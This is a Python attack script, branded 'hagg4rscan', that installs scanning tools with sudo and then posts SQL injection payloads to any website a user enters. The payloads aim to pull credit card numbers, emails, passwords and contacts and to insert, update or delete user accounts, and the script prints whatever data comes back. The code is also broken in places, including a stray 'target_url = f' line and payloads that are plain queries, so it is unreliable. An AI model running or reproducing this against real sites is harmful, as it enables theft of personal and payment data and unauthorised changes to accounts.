import subprocess
import os
import requests
from requests.exceptions import RequestException, SSLError

def run_command(command):
    """Run a command and return its output."""
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return result.stdout, result.stderr

def run_sudo_command(command):
    """Run a command with sudo and return its output."""
    result = subprocess.run(['sudo'] + command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return result.stdout, result.stderr

def save_to_file(filepath, data):
    """Save data to a file."""
    with open(filepath, 'a') as file:
        file.write(data + '\n')

def install_tools():
    """Install necessary tools if not already installed."""
    tools = {
        "uniscan": "sudo apt-get install -y uniscan",
        "nmap": "sudo apt-get install -y nmap",
        "sqlmap": "sudo apt-get install -y sqlmap",
        "nikto": "sudo apt-get install -y nikto",
        "whois": "sudo apt-get install -y whois",
        "subfinder": "sudo apt-get install -y subfinder"
    }
    
    for tool, install_command in tools.items():
        print(f"Checking if {tool} is installed...")
        if not is_tool_installed(tool):
            print(f"{tool} not found. Installing {tool}...")
            stdout, stderr = run_sudo_command(install_command.split())
            if stdout:
                print(stdout)
            if stderr:
                print(stderr)
        else:
            print(f"{tool} is already installed.")

def is_tool_installed(tool_name):
    """Check if a tool is installed."""
    return subprocess.call(["which", tool_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0

def clear_screen():
    """Clear the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_header():
    """Print the header 'hagg4rscan'."""
    header = """
    \033[91m
              ___           ___           ___           ___           ___           ___     
     /\  \         /\  \         /\__\         /\__\         /\  \         /\  \    
     \:\  \       /::\  \       /:/ _/_       /:/ _/_       /::\  \       /::\  \   
      \:\  \     /:/\:\  \     /:/ /\  \     /:/ /\  \     /:/\:\  \     /:/\:\__\  
  ___ /::\  \   /:/ /::\  \   /:/ /::\  \   /:/ /::\  \   /:/ /::\  \   /:/ /:/  /  
 /\  /:/\:\__\ /:/_/:/\:\__\ /:/__\/\:\__\ /:/__\/\:\__\ /:/_/:/\:\__\ /:/_/:/__/___
 \:\/:/  \/__/ \:\/:/  \/__/ \:\  \ /:/  / \:\  \ /:/  / \:\/:/  \/__/ \:\/:::::/  /
  \::/__/       \::/__/       \:\  /:/  /   \:\  /:/  /   \::/__/       \::/~~/~~~~ 
   \:\  \        \:\  \        \:\/:/  /     \:\/:/  /     \:\  \        \:\~~\     
    \:\__\        \:\__\        \::/  /       \::/  /       \:\__\        \:\__\    
     \/__/         \/__/         \/__/         \/__/         \/__/         \/__/    
                                                                                                                                                    
                                                                     
    \033[0m
    """
    print(header)

def perform_sql_injection(target_url):
    """Perform SQL Injection using the provided payloads."""
    payloads = [
        "' OR 1=1 UNION SELECT cc_number, cc_holder, cc_expiration FROM credit_cards --",
        "' OR 1=1 UNION SELECT email FROM users --",
        "' OR 1=1 UNION SELECT password FROM users --",
        "' OR 1=1 UNION SELECT contact_name, contact_number FROM contacts --",
        "SELECT * FROM users WHERE username='admin';",
        "INSERT INTO users (username, password) VALUES ('newuser', 'newpassword');",
        "UPDATE users SET password='newpassword' WHERE username='admin';",
        "DELETE FROM users WHERE username='olduser';",
        "SELECT * FROM products WHERE name LIKE '%user_input%';",
        "SELECT * FROM products WHERE name LIKE '%admin%' UNION SELECT username, password FROM users;",
        "SELECT * FROM users WHERE username='user_input' AND password='password_input';",
        "SELECT * FROM users WHERE username='admin' AND password=' OR 1=1 -- ';",
        "SELECT * FROM products WHERE name LIKE '%user_input%';",
        "SELECT * FROM products WHERE name LIKE '%admin%' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1;",
        "SELECT * FROM products WHERE name LIKE '%user_input%';",
        "SELECT * FROM products WHERE name LIKE '%admin%' AND SLEEP(5);"
    ]

    vulnerable = False

    for payload in payloads:
        data = {
            'username': f'admin{payload}',
            'password': 'password'  # Update with the correct password field if needed
        }

        try:
            response = requests.post(target_url, data=data, verify=False)  # Disabling SSL verification
            if "error" not in response.text.lower():  # Simplified check, should be adapted
                print(response.text)  # This will display the extracted data, handle it as you wish
                vulnerable = True
        except SSLError as e:
            print(f"SSL Error: {e}")
        except RequestException as e:
            print(f"Request Error: {e}")

    return vulnerable

def check_website_status(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"The website {url} is accessible.")
            return True
        else:
            print(f"The website {url} is not accessible. Status code: {response.status_code}")
            return False
    except requests.RequestException as e:
        print(f"An error occurred: {e}")
        return False

def main():
    install_tools()
    
    # Clear the screen after installing the tools
    clear_screen()

    # Print the header
    print_header()

    target_url = input("Enter the URL of the website to check: ")
    target_url = f
    
        # Ensure the URL starts with 'http://' or 'https://'
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url

    # Check if the website is accessible
    if check_website_status(target_url):
        print("Starting SQL Injection test...")
        if perform_sql_injection(target_url):
            print("The website is vulnerable to SQL Injection.")
        else:
            print("The website is not vulnerable to SQL Injection.")
    else:
        print("Cannot proceed with SQL Injection tests as the website is not accessible.")

if __name__ == "__main__":
    main()










